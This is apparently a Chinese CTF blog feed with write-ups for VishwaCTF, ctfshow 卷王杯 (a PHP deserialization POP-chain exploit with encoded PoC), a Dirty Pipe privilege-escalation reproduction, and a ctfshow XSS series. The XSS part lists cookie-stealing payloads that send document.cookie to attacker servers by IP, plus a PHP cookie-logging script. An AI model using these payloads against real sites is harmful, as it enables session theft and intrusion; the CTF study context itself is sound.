576e78697e65445c4a7c8033766770357c3960377460357360703a6f6982452f12f4712f4c769a75b33cb995fa169056168939a8b0b28eafe0d724f18dc4a7</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$str</span>,<span class="variable">$enKey</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$strHex</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$Key</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$rKey</span>=<span class="number">69</span>;</span><br><span class="line">        <span class="variable">$tmpKey</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$enKey</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$Key</span>.=ord(<span class="variable">$enKey</span>[<span class="variable">$i</span>])+<span class="variable">$rKey</span>;</span><br><span class="line">            <span class="variable">$tmpKey</span>.=chr(ord(<span class="variable">$enKey</span>[<span class="variable">$i</span>])+<span class="variable">$rKey</span>);</span><br><span class="line">        &#125;    </span><br><span class="line"></span><br><span class="line">        <span class="variable">$rKeyHex</span>=dechex(<span class="variable">$rKey</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$enKeyHash</span> = hash(<span class="string">&#x27;sha256&#x27;</span>,<span class="variable">$tmpKey</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>,<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str</span>); <span class="variable">$i</span>++,<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$j</span>==strlen(<span class="variable">$Key</span>))&#123;</span><br><span class="line">                <span class="variable">$j</span>=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$strHex</span> .= dechex(ord(<span class="variable">$str</span>[<span class="variable">$i</span>])+<span class="variable">$Key</span>[<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$encTxt</span> = <span class="variable">$strHex</span>.<span class="variable">$rKeyHex</span>.<span class="variable">$enKeyHash</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$encTxt</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$encTxt</span> = encrypt(<span class="variable">$flag</span>, <span class="string">&quot;VishwaCTF&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$encTxt</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>解密脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str2</span> = <span class="string">&quot;576e78697e65445c4a7c8033766770357c3960377460357360703a6f6982&quot;</span>;</span><br><span class="line"><span class="variable">$Key</span>=<span class="string">&#x27;155174184173188166136153139&#x27;</span>;   </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>,<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str2</span>); <span class="variable">$i</span>++,<span class="variable">$j</span>++)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>==strlen(<span class="variable">$Key</span>))&#123;</span><br><span class="line"><span class="variable">$j</span>=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable">$str2</span>[<span class="variable">$i</span>].<span class="variable">$str2</span>[<span class="variable">$i</span>+<span class="number">1</span>];</span><br><span class="line">        <span class="variable">$flag</span> .= chr(hexdec(<span class="variable">$a</span>)-<span class="variable">$Key</span>[<span class="variable">$j</span>]);  </span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><h2 id="Keep-Your-Secrets"><a href="#Keep-Your-Secrets" class="headerlink" title="Keep Your Secrets"></a>Keep Your Secrets</h2><p>进入题目，然后进行注册，发现出现jwt<br><img src="https://img-blog.csdnimg.cn/1f673019cf31480680509bc57b15e6b1.png"></p><p>jwt解密，并修改权限为admin<br>密码利用脚本爆破（owasp）<br>（虽然我的字典没有这个密码！！）<br>之后加入token到header中<br><img src="https://img-blog.csdnimg.cn/0b24261f6a814cba956d80f33f4b329c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="Request-Me-FLAG"><a href="#Request-Me-FLAG" class="headerlink" title="Request Me FLAG"></a>Request Me FLAG</h2><p>进入题目，看提示发现让修改请求方式<br>修改得到<br><img src="https://img-blog.csdnimg.cn/3d3f75bd75064282ac3ee875fe8c2b87.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow 卷王杯</title>
      <link href="/2022/03/09/ctfshow%20%E5%8D%B7%E7%8E%8B%E6%9D%AF/"/>
      <url>/2022/03/09/ctfshow%20%E5%8D%B7%E7%8E%8B%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><p>看源码<br><img src="https://img-blog.csdnimg.cn/f106b99be0794b28b45fc1535910d65c.png" alt="在这里插入图片描述"><br>进入题目<br><img src="https://img-blog.csdnimg.cn/2cfca4ce29aa4da7bbfcc45f2b656092.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>看到题目想到内置类<br>利用数组溢出绕过c<br>再利用内置类得到flag<br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="built_in">FilesystemIterator</span>&amp;b=/<span class="keyword">var</span>/www/html&amp;c=<span class="number">9223372036854775806</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过该函数找到文件夹<br><img src="https://img-blog.csdnimg.cn/96d34e7f7be14299bba8f790caadc5fe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>之后利用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="built_in">SplFileObject</span>&amp;b=flag56ea8b83122449e814e0fd7bfb5f220a.php&amp;c=<span class="number">9223372036854775806</span></span><br></pre></td></tr></table></figure><p>得到flag</p><h2 id="easy-unserialize"><a href="#easy-unserialize" class="headerlink" title="easy unserialize"></a>easy unserialize</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: F10wers_13eiCheng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>:   2022-02-01 11:25:02</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Last</span> Modified by:   F10wers_13eiCheng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Last</span> Modified time: 2022-02-07 15:08:18</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./HappyYear.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">one</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$object</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">MeMeMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        array_walk(<span class="keyword">$this</span>, <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$fn</span>, <span class="variable">$prev</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$fn</span>[<span class="number">0</span>] === <span class="string">&quot;Happy_func&quot;</span> &amp;&amp; <span class="variable">$prev</span> === <span class="string">&quot;year_parm&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">global</span> <span class="variable">$talk</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$talk</span>&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        @<span class="keyword">$this</span>-&gt;object-&gt;add();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;object-&gt;string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">second</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wow you have sovled&quot;</span>.<span class="keyword">$this</span>-&gt;filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        call_user_func([<span class="keyword">$this</span>, <span class="variable">$func</span>.<span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">third</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$string</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;string = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctfshow&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span>=unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;高一新生报道&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看这位师傅写的博客，比较详细<br><a href="https://blog.csdn.net/not_code_god/article/details/123170171?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164604602616780271936202%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=164604602616780271936202&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-123170171.pc_search_result_control_group&utm_term=ctfshow%20%E5%8D%B7%E7%8E%8B%E6%9D%AF&spm=1018.2226.3001.4187">大佬博客</a><br>最后的exp为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">one</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$object</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$year_parm</span>=<span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&quot;Happy_func&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">second</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">third</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;string=<span class="keyword">array</span>(<span class="string">&quot;string&quot;</span>=&gt;[<span class="keyword">new</span> one(),<span class="string">&quot;MeMeMe&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> one();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> one();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> second();</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> third();</span><br><span class="line"><span class="variable">$b</span>-&gt;object=<span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;filename=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;object=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$n</span>=<span class="literal">null</span>;</span><br><span class="line"><span class="variable">$payload</span>=<span class="keyword">array</span>(<span class="variable">$a</span>,<span class="variable">$n</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$payload</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>BO%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>one%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">object</span>%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>second%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>filename%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>one%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">object</span>%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>third%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>third%<span class="number">00</span><span class="keyword">string</span>%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">string</span>%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>BO%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>one%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">object</span>%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>year_parm%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>Happy_func%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>Di%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>MeMeMe%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>year_parm%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>Happy_func%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>year_parm%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>Happy_func%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>Di%<span class="number">3</span>A0%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>cve-2022-8047复现</title>
      <link href="/2022/03/09/cve-2022-8047%20linux%E6%8F%90%E6%9D%83/"/>
      <url>/2022/03/09/cve-2022-8047%20linux%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>CVE-2022-0847是自 5.8 以来 Linux 内核中的一个漏洞，攻击者利用该漏洞可以覆盖任意只读文件中的数据。这样将普通的权限提升至root权限，因为非特权进程可以将代码注入到根进程</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Linux Kernel版本 &gt;= 5.8<br>Linux Kernel版本 &lt; 5.16.11 / 5.15.25 / 5.10.102</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><a href="https://haxx.in/files/dirtypipez.c">exp</a><br>之后在执行exp<br><img src="https://img-blog.csdnimg.cn/0d06c25f070349098794b771129bbacd.png"><br>之后运行<br><img src="https://img-blog.csdnimg.cn/1501433bef294e15b8f9e18f0771d1ed.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow xss</title>
      <link href="/2022/02/25/ctfshow%20xss/"/>
      <url>/2022/02/25/ctfshow%20xss/</url>
      
        <content type="html"><![CDATA[<p>集一下可用的姿势吧，</p><blockquote><p>window.open:open() 方法用于打开一个新的浏览器窗口或查找一个已命名的窗口。<br>location.href=”/url”当前页面打开URL页面<br>windows.location.href=”/url” 当前页面打开URL页面<br>onfocus事件在对象获得焦点时发生<br> autofocus 属性规定当页面加载时 input 元素应该自动获得焦点。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(<span class="string">&#x27;http://ip:端口/&#x27;</span>+document.cookie)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;window.location.href=<span class="string">&#x27;http://ip:端口/&#x27;</span>+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;location.href=<span class="string">&#x27;http://ip:端口/&#x27;</span>+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;input onfocus=<span class="string">&quot;window.open(&#x27;http://ip:端口/&#x27;+document.cookie)&quot;</span> autofocus&gt;</span><br><span class="line"><span class="comment"># 通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>onload 事件会在页面或图像加载完成后立即发生。</p><p>svg标签</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=<span class="string">&quot;window.open(&#x27;http://ip:端口/&#x27;+document.cookie)&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>iframe标签</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=<span class="string">&quot;window.open(&#x27;http://ip:端口/&#x27;+document.cookie)&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p>body标签</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=<span class="string">&quot;window.open(&#x27;http://ip:端口/&#x27;+document.cookie)&quot;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>img：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> img=document.createElement(<span class="string">&quot;img&quot;</span>); img.src=<span class="string">&quot;http://118.31.168.198:39543/&quot;</span>+document.cookie;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><p>利用自己的服务器在服务器页面上写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># a.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = fopen(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后在题目页面写入js</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// js代码</span></span><br><span class="line">&lt;script&gt;document.location.href=<span class="string">&#x27;http://xxx/a.php?cookie=&#x27;</span>+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后在服务器内得到flag</p><h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><p>script标签被过滤，可以用body</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=<span class="string">&quot;window.location.href=&#x27;http://124.222.115.141/a.php?cookie=&#x27;+document.cookie&quot;</span>&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure><h2 id="web-318"><a href="#web-318" class="headerlink" title="web 318"></a>web 318</h2><p>过滤了img,用317得payload</p><h2 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h2><p>同上</p><h2 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320</h2><p>本题空格被过滤<br>利用%09得url解码进行解题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;bodyonload=<span class="string">&quot;window.location.href=&#x27;http://124.222.115.141/a.php?cookie=&#x27;+document.cookie&quot;</span>&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure><h2 id="web321"><a href="#web321" class="headerlink" title="web321"></a>web321</h2><p>同上</p><h2 id="web322"><a href="#web322" class="headerlink" title="web322"></a>web322</h2><p>又把iframe给过滤了<br>poc同上</p><h2 id="web323"><a href="#web323" class="headerlink" title="web323"></a>web323</h2><p>同上</p><h2 id="web324-326"><a href="#web324-326" class="headerlink" title="web324~326"></a>web324~326</h2><p>同上</p><h2 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h2><p>存储型XSS。首先就是poster必须是admin才能发送成功，其次就是XSS的触发点应该是sender和content都可以。直接用一下xss平台的payload就可以了。（不要用img，img似乎被过滤）<br><img src="https://img-blog.csdnimg.cn/5048b8ef24b94db991a3b4773d66cf4c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h2><p>看到后先注册，之后发现必须是管理员才能查看<br>于是注册时利用下面的作为密码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=<span 